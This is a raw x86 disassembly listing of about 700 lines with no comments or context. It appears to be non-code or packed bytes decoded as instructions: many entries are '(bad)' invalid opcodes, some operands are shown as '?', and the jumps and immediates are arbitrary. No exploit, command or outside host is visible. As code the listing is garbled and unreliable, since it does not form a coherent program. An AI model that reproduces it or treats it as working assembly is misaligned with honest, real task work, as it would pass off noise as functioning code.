  40c682:	xor    ah,dl
  40c684:	sub    BYTE PTR gs:0x34768305,ch
  40c68b:	adc    al,0x0
  40c68d:	add    BYTE PTR [eax],dh
  40c68f:	shl    BYTE PTR [ebp+0x28],1
  40c692:	xor    eax,0x2c628305
  40c697:	adc    al,0x0
  40c699:	pop    esp
  40c69a:	lock lahf 
  40c69c:	dec    edi
  40c69d:	je     0x40c68f
  40c69f:	fwait
  40c6a0:	dec    edi
  40c6a1:	ins    BYTE PTR es:[edi],dx
  40c6a2:	add    BYTE PTR [eax],al
  40c6a4:	lock xchg edi,eax
  40c6a6:	dec    edi
  40c6a7:	xchg   esi,eax
  40c6a8:	mov    al,ds:0x35286559
  40c6ad:	xchg   ebp,eax
  40c6ae:	je     0x40c6b0
  40c6b0:	push   0xfff8bc79
  40c6b5:	push   0x40b0458b
  40c6ba:	lea    eax,[ebp-0x14]
  40c6bd:	aas    
  40c6be:	lea    eax,[ebp+0x8]
  40c6c1:	inc    eax
  40c6c2:	push   DWORD PTR ds:0x40f214
  40c6c8:	jmp    edx
  40c6ca:	psubsb mm6,QWORD PTR [eax+ebp*2+0x52bdfffd]
  40c6d2:	fcom   QWORD PTR [eax-0x33]
  40c6d5:	push   edx
  40c6d6:	loopne 0x40c728
  40c6d8:	int    0x52
  40c6da:	in     al,0x50
  40c6dc:	pop    edi
  40c6dd:	mov    ds:0x10d966be,eax
  40c6e2:	push   DWORD PTR [ebp+0x18]
  40c6e5:	jns    0x40c66f
  40c6e7:	clc    
  40c6e8:	aas    
  40c6e9:	imul   edi,ebp,0x44193475
  40c6ef:	aam    0x2f
  40c6f1:	jecxz  0x40c6ce
  40c6f3:	(bad)  
  40c6f4:	aad    0xc8
  40c6f6:	lds    eax,FWORD PTR [ebp+0x18]
  40c6f9:	adc    BYTE PTR [eax],al
  40c6fb:	add    al,bl
  40c6fd:	sbb    eax,DWORD PTR [esp+ecx*8+0x28]
  40c701:	test   BYTE PTR [eax],0x6a
  40c704:	enter  0xfff6,0x69
  40c708:	add    BYTE PTR [eax],al
  40c70a:	enter  0xfff6,0x8c
  40c70e:	adc    eax,0xe5ff4ec4
  40c713:	stos   BYTE PTR es:[edi],al
  40c714:	daa    
  40c715:	inc    ecx
  40c716:	enter  0xbe95,0xf
  40c71a:	inc    esp
  40c71b:	xchg   edi,eax
  40c71c:	(bad)  
  40c71d:	call   FWORD PTR [eax-0x672f8473]
  40c723:	cdq    
  40c724:	add    BYTE PTR [eax],0x89
  40c727:	adc    BYTE PTR [eax],al
  40c729:	mov    esi,DWORD PTR [ecx]
  40c72b:	lock mov bh,0x3a
  40c72e:	cld    
  40c72f:	mov    ?,ecx
  40c731:	xchg   BYTE PTR [ebp-0x56],bh
  40c734:	add    al,BYTE PTR [eax]
  40c736:	jge    0x40c759
  40c738:	xor    al,dl
  40c73a:	stos   BYTE PTR es:[edi],al
  40c73b:	lahf   
  40c73c:	(bad)  
  40c73d:	mov    bh,ah
  40c73f:	jbe    0x40c6e6
  40c741:	add    DWORD PTR [edx-0x7a],esp
  40c744:	test   eax,0x40256d74
  40c749:	in     al,0x56
  40c74b:	mov    bh,0xd2
  40c74d:	out    0x6e,eax
  40c74f:	clc    
  40c750:	add    eax,DWORD PTR [eax]
  40c752:	mov    dl,0xcf
  40c754:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c755:	jmp    FWORD PTR [edi]
  40c757:	das    
  40c758:	mov    ecx,0x85aa36ff
  40c75d:	jl     0x40c780
  40c75f:	jle    0x40c75a
  40c761:	sub    ebp,0x7d
  40c764:	add    al,BYTE PTR [eax]
  40c766:	mov    dl,0xb0
  40c768:	sahf   
  40c769:	jmp    DWORD PTR [edi]
  40c76b:	add    DWORD PTR [ebp-0x1],ebp
  40c76e:	add    BYTE PTR [eax],al
  40c770:	push   cs
  40c771:	jle    0x40c71c
  40c773:	je     0x40c77a
  40c775:	es ins DWORD PTR es:[edi],dx
  40c777:	pusha  
  40c778:	(bad)  
  40c779:	xchg   edx,eax
  40c77a:	jp     0x40c7c0
  40c77c:	jmp    0xef3cf60b
  40c781:	or     BYTE PTR [ebx-0x648ea302],bh
  40c787:	fist   WORD PTR [eax+0x72]
  40c78a:	test   al,0x67
  40c78c:	push   0xd9004341
  40c791:	icebp  
  40c792:	cmc    
  40c793:	inc    esi
  40c795:	sub    eax,0x3c75491c
  40c79a:	add    al,0xff
  40c79c:	cmp    al,0xb5
  40c79e:	fwait
  40c79f:	sub    eax,0xb027d65
  40c7a4:	jno    0x40c7ba
  40c7a6:	sbb    eax,0x24e4090c
  40c7ab:	inc    ebx
  40c7ac:	xor    DWORD PTR [eax+ebx*1-0xa],edi
  40c7b0:	mov    ss,WORD PTR [ebx-0x281ee3c8]
  40c7b6:	daa    
  40c7b7:	add    al,0x7e
  40c7b9:	or     DWORD PTR [ecx-0x16b7df64],esi
  40c7bf:	add    edi,DWORD PTR [edx]
  40c7c1:	push   esp
  40c7c2:	hlt    
  40c7c3:	or     ebx,ecx
  40c7c5:	jmp    0x40c773
  40c7c7:	inc    edx
  40c7c8:	xor    DWORD PTR [esp+esi*4-0xb],edi
  40c7cc:	push   esi
  40c7cd:	xchg   ebx,eax
  40c7ce:	mov    eax,0xa7d7e91b
  40c7d3:	add    eax,DWORD PTR [eax]
  40c7d5:	add    BYTE PTR [esi+0x9],al
  40c7d8:	xor    DWORD PTR [esp+eax*2+0x2a03e947],ebx
  40c7df:	push   esp
  40c7e0:	mov    ebx,0xe914993e
  40c7e5:	cwde   
  40c7e6:	in     al,0x92
  40c7e8:	fwait
  40c7e9:	not    DWORD PTR [esi]
  40c7eb:	into   
  40c7ec:	mov    ebx,0xdb9317a8
  40c7f1:	imul   edx,DWORD PTR [ebp+edx*8+0x207da8e8],0x11
  40c7f9:	pop    eax
  40c7fa:	pop    ebp
  40c7fb:	xchg   ebx,eax
  40c7fc:	std    
  40c7fd:	test   al,0x7d
  40c7ff:	nop
  40c800:	cmc    
  40c801:	cs in  eax,0x92
  40c804:	jae    0x40c7fd
  40c806:	into   
  40c807:	addr16 inc ebx
  40c809:	test   eax,0xb45392df
  40c80e:	xlat   BYTE PTR ds:[ebx]
  40c80f:	or     cl,al
  40c811:	test   al,0x45
  40c813:	and    cl,al
  40c815:	shl    DWORD PTR [ebp-0x6d],0xc5
  40c819:	test   al,0x45
  40c81b:	js     0x40c7da
  40c81d:	cs aad 0x92
  40c820:	(bad)  
  40c821:	cmp    ebp,DWORD PTR [ecx-0x27f34886]
  40c827:	xchg   ecx,eax
  40c828:	(bad)  
  40c829:	sbb    al,0xdd
  40c82b:	jp     0x40c81d
  40c82d:	or     eax,ecx
  40c82f:	xchg   ecx,eax
  40c830:	pop    esi
  40c831:	aaa    
  40c832:	retf   0xf54
  40c835:	jmp    0x6b2c6731
  40c83a:	add    BYTE PTR [eax],al
  40c83c:	mov    esi,0x26fc827a
  40c841:	sbb    DWORD PTR [edi],ecx
  40c843:	ins    BYTE PTR es:[edi],dx
  40c844:	inc    ebp
  40c845:	adc    eax,0xd7dfe900
  40c84a:	repz mov ecx,0xb9f7d7e7
  40c850:	(bad)  
  40c852:	sti    
  40c853:	mov    ecx,0xd4ff162c
  40c858:	and    bh,BYTE PTR [eax+eiz*1+0x3e]
  40c85c:	mov    DWORD PTR [ecx+0x138abc82],edx
  40c862:	(bad)  
  40c864:	in     eax,0x91
  40c866:	(bad)  
  40c867:	jmp    0x7734d145
  40c86c:	pop    edi
  40c86d:	test   BYTE PTR [edi+0x0],ah
  40c870:	jno    0x40c845
  40c872:	call   DWORD PTR ds:0xc3e7845f
  40c878:	cld    
  40c879:	xchg   ecx,eax
  40c87a:	(bad)  
  40c87b:	repnz repnz and al,BYTE PTR [ebp+0x143221]
  40c883:	fs das 
  40c885:	mov    BYTE PTR [edi+0x5c],cl
  40c888:	daa    
  40c889:	mov    WORD PTR [edi+0x74],cs
  40c88c:	jo     0x40c81e
  40c88e:	dec    edi
  40c88f:	push   ebx
  40c890:	sub    eax,0xaaf97491
  40c895:	ja     0x40c88c
  40c897:	into   
  40c898:	mov    ss,WORD PTR [esi+0x17f0007c]
  40c89e:	jne    0x18f0c8a4
  40c8a4:	add    BYTE PTR [eax],al
  40c8a6:	out    0x43,eax
  40c8a8:	hlt    
  40c8a9:	push   0x40d56c
  40c8ae:	rol    BYTE PTR [edi-0x7177ffd0],0xbe
  40c8b5:	nop    ebp
  40c8b8:	(bad)  
  40c8b9:	call   FWORD PTR [eax+0x18f4440c]
  40c8bf:	or     eax,DWORD PTR [eax+edi*8+0x18]
  40c8c3:	or     eax,DWORD PTR [esp+edi*8+0x48]
  40c8c7:	cs add edi,edi
  40c8ca:	pop    ebp
  40c8cb:	and    eax,0xb8feb1e8
  40c8d0:	std    
  40c8d1:	xor    DWORD PTR [ebp-0x43],0xfffffffe
  40c8d5:	push   cs
  40c8d6:	fst    QWORD PTR [esi+edi*8+0x440e58ff]
  40c8dd:	hlt    
  40c8de:	test   DWORD PTR [edi+0xae4458d],0xbc8f444
  40c8e8:	inc    esp
  40c8e9:	clc    
  40c8ea:	enter  0x440b,0xfc
  40c8ee:	fsubr  DWORD PTR [edx]
  40c8f0:	add    al,0xff
  40c8f2:	mov    ebp,0x2e89e824
  40c8f7:	mov    ecx,0xbcb583fd
  40c8fc:	push   DWORD PTR [edi+edx*8-0x2f]
  40c900:	add    edi,DWORD PTR [esi+ebp*4+0xfeffd7]
  40c907:	add    bh,ah
  40c909:	mov    ecx,0x54cdc7fd
  40c90e:	fs inc ecx
  40c910:	enter  0xfdb9,0xff
  40c914:	not    ecx
  40c916:	add    eax,esp
  40c918:	xor    ecx,esp
  40c91a:	inc    esp
  40c91b:	add    dh,al
  40c91d:	popa   
  40c91e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c91f:	(bad)  
  40c920:	mov    esi,0x33e7b04f
  40c925:	iret   
  40c926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c927:	(bad)  
  40c928:	jbe    0x40c969
  40c92a:	pushf  
  40c92b:	add    BYTE PTR [ecx],dh
  40c92d:	jnp    0x40c931
  40c92f:	sbb    DWORD PTR [edi+esi*8+0x1c],0x41
  40c934:	xor    DWORD PTR [edx+0x67b2292e],esi
  40c93a:	ret    0xf065
  40c93d:	jp     0x40c8e4
  40c93f:	jae    0x40c992
  40c941:	(bad)  
  40c942:	out    0xc3,eax
  40c944:	(bad)  
  40c946:	add    al,0xff
  40c948:	in     eax,0x71
  40c94a:	sbb    dh,al
  40c94c:	pushf  
  40c94d:	cmp    al,BYTE PTR [ecx*4-0xad1d0c]
  40c954:	(bad)  
  40c956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c957:	je     0x40c996
  40c959:	jmp    0xfeaa:0x7259082f
  40c960:	ds inc ebx
  40c962:	ror    DWORD PTR [edi],0x31
  40c965:	test   al,0x79
  40c967:	jmp    0x40c91b
  40c969:	inc    ecx
  40c96a:	xchg   edi,eax
  40c96b:	inc    BYTE PTR [eax]
  40c96d:	add    BYTE PTR [ebp+esi*2+0x36789c9a],bl
  40c974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c975:	imul   eax,DWORD PTR [ecx+0x0],0x2661f040
  40c97c:	xor    BYTE PTR [eax],cl
  40c97e:	sbb    DWORD PTR [edi-0x7d0100b6],eax
  40c984:	ret    0x2d74
  40c987:	inc    esp
  40c988:	rol    DWORD PTR [edi],0x31
  40c98b:	xchg   ebx,eax
  40c98c:	adc    ch,BYTE PTR [eax-0x3]
  40c98f:	mov    edx,0x14ac0043
  40c994:	sub    al,0xb4
  40c996:	data16 jl 0x40c96e
  40c999:	inc    ebp
  40c99a:	into   
  40c99b:	(bad)  
  40c99c:	loope  0x40c961
  40c99e:	cmp    eax,0x36c2a018
  40c9a3:	adc    al,0xae
  40c9a5:	aas    
  40c9a6:	lds    edx,FWORD PTR ds:0xa13103e9
  40c9ac:	sub    ebx,DWORD PTR [eax-0x3cc710a]
  40c9b2:	xchg   esi,eax
  40c9b3:	cmp    DWORD PTR [ebx-0x5b],eax
  40c9b6:	xchg   edi,eax
  40c9b7:	sbb    ebp,DWORD PTR [ecx+0x13933730]
  40c9bd:	cwde   
  40c9be:	xchg   BYTE PTR [eax],cl
  40c9c0:	out    0xd8,eax
  40c9c2:	mov    esi,0x76fcaa5d
  40c9c7:	(bad)  
  40c9c9:	mov    edx,0x9c98195b
  40c9ce:	jecxz  0x40c9e4
  40c9d0:	sub    cl,bh
  40c9d2:	add    BYTE PTR [eax],al
  40c9d4:	sahf   
  40c9d5:	or     DWORD PTR [esi+0x4c],ebx
  40c9d8:	mov    dl,0x8c
  40c9da:	out    0x2e,eax
  40c9dc:	xor    al,0xcc
  40c9de:	call   0x6a54f9e6
  40c9e3:	stos   DWORD PTR es:[edi],eax
  40c9e4:	xor    DWORD PTR [eax],ecx
  40c9e6:	out    dx,eax
  40c9e7:	fdiv   DWORD PTR [esi+0x5d]
  40c9ea:	sub    bh,ah
  40c9ec:	cs mov dl,0x7c
  40c9ef:	push   ds
  40c9f0:	jo     0x40ca06
  40c9f2:	pop    esp
  40c9f3:	aas    
  40c9f4:	or     eax,0x292f25e4
  40c9f9:	jl     0x40c9e6
  40c9fb:	dec    ecx
  40c9fc:	push   cs
  40c9fd:	(bad)
  40ca01:	or     ah,ah
  40ca03:	add    BYTE PTR [esi],0x12
  40ca06:	jl     0x40ca05
  40ca08:	mov    bl,0x10
  40ca0a:	or     eax,0x166404
  40ca0f:	ret    0x5bf2
  40ca12:	shl    ecx,0x32
  40ca15:	mov    eax,ds:0x8f82d544
  40ca1a:	je     0x40ca0d
  40ca1c:	stos   BYTE PTR es:[edi],al
  40ca1d:	jns    0x40ca77
  40ca1f:	(bad)  
  40ca20:	lea    edx,[ecx+0x190ee8f7]
  40ca26:	add    ecx,0x30
  40ca29:	or     DWORD PTR [esi],eax
  40ca2b:	push   0x57
  40ca2d:	cmp    bh,0x3b
  40ca30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca31:	cmp    eax,eax
  40ca33:	mov    al,ds:0x74001670
  40ca38:	add    BYTE PTR [eax],al
  40ca3a:	push   edi
  40ca3b:	or     BYTE PTR [edi-0x62],0x5f
  40ca3f:	sbb    al,0xe8
  40ca41:	mov    al,ds:0xe2fe8efb
  40ca46:	jb     0x40ca4f
  40ca48:	push   es
  40ca49:	push   0x4f
  40ca4b:	cmp    bh,0xf3
  40ca4e:	ins    BYTE PTR es:[edi],dx
  40ca4f:	cmp    eax,eax
  40ca51:	mov    al,ds:0x5c001670
  40ca56:	pop    ds
  40ca57:	or     BYTE PTR [edi+0x66],0x7
  40ca5b:	sbb    al,0xe8
  40ca5d:	mov    ebx,?
  40ca5f:	mov    ?,esi
  40ca61:	push   0xffffff9a
  40ca63:	dec    esi
  40ca64:	jne    0x40ca4d
  40ca66:	mov    cl,0xf
  40ca68:	in     al,dx
  40ca69:	jmp    0x296be075
  40ca6e:	jmp    0x40cac3
  40ca70:	pop    es
  40ca71:	jmp    0x9a2ca315
  40ca76:	aad    0x8
  40ca78:	or     BYTE PTR [ecx],dl
  40ca7a:	ret    0xfeec
  40ca7d:	push   ds
  40ca7e:	mov    cl,0x85
  40ca80:	pop    ds
  40ca81:	pushf  
  40ca82:	add    al,0x93
  40ca84:	jl     0x40ca83
  40ca86:	xor    eax,DWORD PTR [edi]
  40ca88:	push   es
  40ca89:	add    bl,ah
  40ca8b:	push   ecx
  40ca8c:	mov    edx,0x458d11e0
  40ca92:	sub    al,0xe1
  40ca94:	(bad)  
  40ca95:	jne    0x40ca67
  40ca97:	test   eax,0xb1cf5971
  40ca9c:	cmp    eax,0x2b380000
  40caa2:	push   es
  40caa3:	sbb    DWORD PTR [ebp-0x3c],0xfffffffe
  40caa7:	je     0x40ca7f
  40caa9:	jle    0x40ca69
  40caab:	leave  
  40caac:	mov    ah,BYTE PTR [eax]
  40caae:	add    BYTE PTR [ebp+0x6a4ec455],cl
  40cab4:	cmp    BYTE PTR [ecx+0x31700873],dh
  40caba:	pop    ecx
  40cabb:	dec    edi
  40cabd:	mov    ds:0xb148ec43,eax
  40cac2:	jae    0x40cacc
  40cac4:	mov    al,0xc1
  40cac6:	push   esi
  40cac7:	jmp    FWORD PTR [edi+0x7a01f695]
  40cacd:	push   ds
  40cace:	cmp    eax,0x5b
  40cad1:	sub    al,BYTE PTR [esi]
  40cad3:	sbb    DWORD PTR [ebp-0x43],0xfffffffe
  40cad7:	je     0x40cb2f
  40cad9:	jle    0x40ca99
  40cadb:	leave  
  40cadc:	or     ah,BYTE PTR [eax]
  40cade:	add    BYTE PTR [ebx+0x413a90],ah
  40cae4:	int    0xda
  40cae6:	jmp    0x40cb38
  40cae8:	jb     0x40cb63
  40caea:	std    
  40caeb:	jne    0x40cb2d
  40caed:	mov    ecx,0xb16f5948
  40caf2:	lds    sp,DWORD PTR [edi-0x2a730028]
  40caf9:	mov    esp,0xb2096a4e
  40cafe:	jae    0x40cb0c
  40cb00:	das    
  40cb01:	sub    ecx,DWORD PTR [eax]
  40cb03:	call   0x9771cb08
  40cb08:	cwde   
  40cb09:	(bad)  
  40cb0a:	(bad)  
  40cb0b:	xor    eax,esi
  40cb0d:	pop    es
  40cb0e:	xor    DWORD PTR [eax+0x36b2eb8d],esi
  40cb14:	mov    al,ds:0x32876c8c
  40cb19:	call   0xfee27366
  40cb1e:	(bad)  
  40cb1f:	out    dx,eax
  40cb20:	lahf   
  40cb21:	inc    BYTE PTR [edi+edi*2-0x56]
  40cb25:	dec    esi
  40cb26:	pop    esi
  40cb27:	mov    ax,ds:0x12e6f10a
  40cb2d:	(bad)  
  40cb2e:	cmp    al,0x83
  40cb30:	mov    eax,ds:0xdd62ad74
  40cb35:	std    
  40cb36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb37:	lds    ecx,FWORD PTR ds:0xa17b24c0
  40cb3d:	je     0x40cad4
  40cb3f:	mov    ds:0xad8e5522,al
  40cb44:	retf   
  40cb45:	shl    DWORD PTR ds:0x8d8b377b,0x9d
  40cb4c:	pop    ss
  40cb4d:	or     al,0x89
  40cb4f:	leave  
  40cb50:	and    al,0xff
  40cb52:	outs   dx,BYTE PTR ds:[esi]
  40cb53:	add    edx,0x18061273
  40cb59:	adc    BYTE PTR [ecx],al
  40cb5b:	xchg   ebx,eax
  40cb5c:	int3   
  40cb5d:	pusha  
  40cb5e:	push   esi
  40cb5f:	cmc    
  40cb60:	xor    ch,BYTE PTR [eax-0x47]
  40cb63:	mov    al,0x42
  40cb65:	add    BYTE PTR [esi+0x6f],al
  40cb68:	cli    
  40cb69:	inc    BYTE PTR [eax]
  40cb6b:	add    ah,al
  40cb6d:	xchg   BYTE PTR [edx],dh
  40cb6f:	(bad)  
  40cb70:	mov    esp,0xb1e5aa82
  40cb75:	dec    edx
  40cb76:	mov    ds:0xa1a0e4e7,al
  40cb7b:	(bad)  
  40cb7c:	call   0x7e40c2c0
  40cb81:	adc    al,0x72
  40cb83:	scas   eax,DWORD PTR es:[edi]
  40cb84:	xchg   esi,eax
  40cb85:	adc    al,0xe9
  40cb87:	mov    dl,0xc4
  40cb89:	cld    
  40cb8a:	sub    BYTE PTR [esi+0x70],al
  40cb8d:	adc    al,0xe
  40cb8f:	sbb    BYTE PTR ds:0x65a2e2fe,ah
  40cb95:	sbb    al,0x11
  40cb97:	push   ebx
  40cb98:	out    0x8b,eax
  40cb9a:	cmc    
  40cb9b:	sub    dh,BYTE PTR [ecx]
  40cb9d:	adc    al,0xfe
  40cb9f:	pusha  
  40cba0:	dec    esi
  40cba1:	pop    ebp
  40cba2:	sub    DWORD PTR [ebx+0x31],eax
  40cba5:	mov    edx,DWORD PTR [ebx+0x10]
  40cba8:	pop    ebx
  40cba9:	cs (bad) 
  40cbab:	pop    ss
  40cbac:	sub    DWORD PTR [edi+ebp*2-0x5f],edi
  40cbb0:	mov    bh,0x8b
  40cbb2:	push   eax
  40cbb3:	add    al,0x31
  40cbb5:	jnp    0x40cc35
  40cbb7:	sub    al,0x71
  40cbb9:	xlat   BYTE PTR ds:[ebx]
  40cbba:	daa    
  40cbbb:	add    al,0x9e
  40cbbd:	add    ebp,ebx
  40cbbf:	sub    eax,0xc1b8b35
  40cbc4:	cdq    
  40cbc5:	xchg   esi,eax
  40cbc6:	popf   
  40cbc7:	mov    eax,ds:0x3e8fc87
  40cbcc:	mov    cs,edx
  40cbce:	add    bl,cl
  40cbd0:	add    BYTE PTR [eax],al
  40cbd2:	repz aam 0xe8
  40cbd5:	mov    al,ds:0x1317e5
  40cbda:	add    cx,sp
  40cbdd:	stos   DWORD PTR es:[edi],eax
  40cbde:	retf   
  40cbdf:	mov    ch,BYTE PTR [ebp-0x5f]
  40cbe2:	into   
  40cbe3:	adc    ebp,ecx
  40cbe5:	mov    al,0x8c
  40cbe7:	cld    
  40cbe8:	sub    BYTE PTR [ebp-0x10],al
  40cbeb:	adc    edx,DWORD PTR [esi+0x17]
  40cbee:	sub    eax,0xbda109fe
  40cbf3:	sbb    edx,DWORD PTR [ecx+0x38]
  40cbf6:	mov    edi,DWORD PTR cs:0x14312c
  40cbfd:	inc    esi
  40cbfe:	xchg   ebx,eax
  40cbff:	repz enter 0x73aa,0x14
  40cc04:	call   FWORD PTR [esi+edi*1+0x1e1e22fe]
  40cc0b:	sbb    al,0xe8
  40cc0d:	aam    0xd1
  40cc0f:	mov    esi,edi
  40cc11:	and    bh,ch
  40cc13:	adc    al,BYTE PTR [eax]
  40cc15:	pushf  
  40cc16:	mov    ebp,0x9125827e
  40cc1b:	cld    
  40cc1c:	inc    DWORD PTR [edx-0x1e8b75fc]
  40cc22:	mov    bl,al
  40cc24:	pop    ecx
  40cc25:	out    0x91,al
  40cc27:	fwait
  40cc28:	inc    esp
  40cc29:	fstp   QWORD PTR [edx]
  40cc2b:	cmc    
  40cc2c:	inc    ebx
  40cc2d:	sub    BYTE PTR ds:0x8ae1748b,dh
  40cc33:	xlat   BYTE PTR ds:[ebx]
  40cc34:	inc    dh
  40cc36:	add    BYTE PTR [eax],al
  40cc38:	ror    DWORD PTR [ecx-0x2e428c],1
  40cc3e:	pop    es
  40cc3f:	sar    DWORD PTR [ebx],0xee
  40cc42:	(bad)  
  40cc43:	scas   al,BYTE PTR es:[edi]
  40cc44:	imul   edx,DWORD PTR [ebx+eax*1-0x17],0x47
  40cc49:	lahf   
  40cc4a:	jmp    0x40ccb6
  40cc4c:	outs   dx,BYTE PTR ds:[esi]
  40cc4d:	mov    gs,WORD PTR [ecx-0x17]
  40cc50:	dec    esp
  40cc51:	inc    edi
  40cc52:	call   DWORD PTR [eiz*1-0x6fdce384]
  40cc59:	mov    DWORD PTR [eax+0x6ff29124],ecx
  40cc5f:	sub    eax,0xf4ff13f2
  40cc64:	sub    bh,BYTE PTR [ebx+ebx*1+0x66]
  40cc68:	xchg   ecx,eax
  40cc69:	mov    esi,edi
  40cc6b:	aam    0xa6
  40cc6d:	mov    DWORD PTR [ecx+eiz*8-0x76],esi
  40cc71:	rcr    BYTE PTR [ecx+0x4e],cl
  40cc74:	xchg   ecx,eax
  40cc75:	pop    ebx
  40cc76:	rol    DWORD PTR [eax],0x1c
  40cc79:	push   ss
  40cc7a:	push   ebp
  40cc7b:	mov    esi,DWORD PTR [eax+edx*4-0x3e]
  40cc7f:	clc    
  40cc80:	repnz adc eax,0x2247346a
  40cc86:	or     al,ch
  40cc88:	and    al,0x4e
  40cc8a:	(bad)  
  40cc8b:	inc    DWORD PTR [ecx-0x5d97042e]
  40cc91:	rol    DWORD PTR [eax+0x0],1
  40cc94:	daa    
  40cc95:	and    cl,BYTE PTR [eax]
  40cc97:	call   0x3e7fdf
  40cc9c:	add    BYTE PTR [eax],al
  40cc9e:	ret    0x6815
  40cca1:	call   0xd14e:0x67ffd68c
  40cca8:	inc    eax
  40cca9:	add    bh,dl
  40ccab:	imul   ebx,DWORD PTR [edx+0x29],0x19
  40ccaf:	adc    al,ch
  40ccb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccb2:	pop    es
  40ccb3:	test   eax,0x2c880bfd
  40ccb8:	aas    
  40ccb9:	mov    DWORD PTR [ebp-0x58],ebx
  40ccbc:	data16 mov BYTE PTR [edx-0x77980030],dh
  40ccc3:	adc    eax,0x4ff0beef
  40ccc8:	inc    ecx
  40ccc9:	inc    ecx
  40ccca:	cwde   
  40cccb:	stos   BYTE PTR es:[edi],al
  40cccc:	jae    0x40ccc6
  40ccce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cccf:	sub    ecx,DWORD PTR [eax]
  40ccd1:	call   0x3ff5ce
  40ccd6:	xor    BYTE PTR [eax+0x3d5840b8],bl
  40ccdc:	add    BYTE PTR [eax],al
  40ccde:	mov    bh,0xea
  40cce0:	leavew 
  40cce2:	or     ecx,edi
  40cce4:	(bad)  
  40cce5:	(bad)  
  40cce6:	pop    ebp
  40cce7:	lods   eax,DWORD PTR ds:[esi]
  40cce8:	std    
  40cce9:	jne    0x40cd2b
  40cceb:	mov    ebp,0xa8e77f74
  40ccf0:	std    
  40ccf1:	jne    0x40cd24
  40ccf3:	jecxz  0x40cca0
  40ccf5:	dec    ecx
  40ccf6:	aad    0xd9
  40ccf8:	sahf   
  40ccf9:	(bad)  
  40ccfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccfb:	iret   
  40ccfc:	sahf   
  40ccfd:	je     0x40cd38
  40ccff:	jecxz  0x40cd61
  40cd01:	pop    eax
  40cd02:	add    BYTE PTR [eax],al
  40cd04:	push   ds
  40cd05:	inc    edx
  40cd06:	int    0xc1
  40cd08:	sub    eax,0x1d8b377b
  40cd0d:	inc    bh
  40cd0f:	sti    
  40cd10:	fwait
  40cd11:	jnp    0x40cd3b
  40cd13:	xor    eax,0xe80aa7fe
  40cd18:	nop
  40cd19:	les    ebx,FWORD PTR [ebp-0x61484702]
  40cd1f:	addr16 (bad) 
  40cd21:	scas   al,BYTE PTR es:[edi]
  40cd22:	inc    ebx
  40cd23:	add    dh,bl
  40cd25:	pop    es
  40cd26:	or     ebp,eax
  40cd28:	push   ecx
  40cd29:	jns    0x40ccc8
  40cd2b:	dec    dh
  40cd2d:	out    0x9f,eax
  40cd2f:	(bad)  
  40cd30:	cmp    al,0x83
  40cd32:	stos   BYTE PTR es:[edi],al
  40cd33:	mov    ebx,DWORD PTR [eax+0x62]
  40cd36:	popf   
  40cd37:	enter  0x6ef3,0x2
  40cd3b:	push   ebp
  40cd3c:	mov    edx,0xa5c3815e
  40cd41:	in     al,0x3
  40cd43:	push   0x67
  40cd45:	ret    0x817
  40cd48:	mov    DWORD PTR [edx+0x38eff3b],ecx
  40cd4e:	dec    eax
  40cd4f:	cld    
  40cd50:	sbb    edx,ebx
  40cd52:	inc    esi
  40cd53:	inc    ecx
  40cd54:	xor    DWORD PTR [edx-0x3676f7e9],esp
  40cd5a:	pushf  
  40cd5b:	(bad)  
  40cd5c:	outs   dx,BYTE PTR ds:[esi]
  40cd5d:	xchg   ecx,eax
  40cd5e:	pop    ss
  40cd5f:	cld    
  40cd60:	data16 jg 0x40cd6d
  40cd63:	call   0xfedff162
  40cd68:	add    BYTE PTR [eax],al
  40cd6a:	push   0xe40006bc
  40cd6f:	adc    esi,DWORD PTR [edx-0x51]
  40cd72:	mov    bl,0x4f
  40cd74:	pop    esp
  40cd75:	sub    DWORD PTR [ecx],esi
  40cd77:	(bad)  
  40cd78:	sbb    eax,0x411bbd9f
  40cd7d:	sahf   
  40cd7e:	xchg   BYTE PTR [edi-0x779273bb],al
  40cd84:	rcr    BYTE PTR [edx+esi*2-0x2b],1
  40cd88:	call   0x415d6b2b
  40cd8d:	popf   
  40cd8e:	or     eax,0x7d9e2588
  40cd93:	mov    BYTE PTR ds:0xc27c2918,bl
  40cd99:	cmp    al,0xf6
  40cd9b:	xchg   DWORD PTR [edi],ebx
  40cd9d:	shl    DWORD PTR [edx],0x14
  40cda0:	pushf  
  40cda1:	mov    bl,dl
  40cda3:	xchg   ebx,eax
  40cda4:	and    al,0x9f
  40cda6:	dec    eax
  40cda7:	adc    al,0x83
  40cda9:	fcmovnbe st,st(7)
  40cdab:	add    ecx,esp
  40cdad:	stos   DWORD PTR es:[edi],eax
  40cdae:	cld    
  40cdaf:	in     al,dx
  40cdb0:	in     eax,0x9d
  40cdb2:	mov    ecx,0xf02cdcd1
  40cdb7:	shl    BYTE PTR [edi],1
  40cdb9:	add    al,0xb6
  40cdbb:	add    ecx,esp
  40cdbd:	stos   DWORD PTR es:[edi],eax
  40cdbe:	jge    0x40cd49
  40cdc0:	lds    ebx,FWORD PTR [ebp-0x6242fe59]
  40cdc6:	and    eax,0xfe9bc11c
  40cdcb:	xchg   BYTE PTR [ebp+0x700000cb],ch
  40cdd1:	adc    cl,ch
  40cdd3:	ss mov edx,0x2d179d78
  40cdd9:	jl     0x40ce2c
  40cddb:	cmp    eax,0xc3e18776
  40cde0:	loop   0x40ce0a
  40cde2:	adc    DWORD PTR [eax+0x33e8d4f2],edi
  40cde8:	dec    ecx
  40cde9:	in     al,0xff
  40cdeb:	adc    eax,0x6e4f86b4
  40cdf0:	es and al,0x50
  40cdf3:	pushw  ds
  40cdf5:	sbb    al,0xe8
  40cdf7:	push   esi
  40cdf8:	xchg   DWORD PTR [esi-0x1517be02],eax
  40cdfe:	dec    BYTE PTR [esi-0x6]
  40ce01:	push   esp
  40ce02:	or     ebp,ecx
  40ce04:	pop    edi
  40ce05:	fwait
  40ce06:	jmp    0x40ce72
  40ce08:	jmp    0x3304248b
  40ce0d:	cli    
  40ce0e:	cmp    BYTE PTR [esi],ch
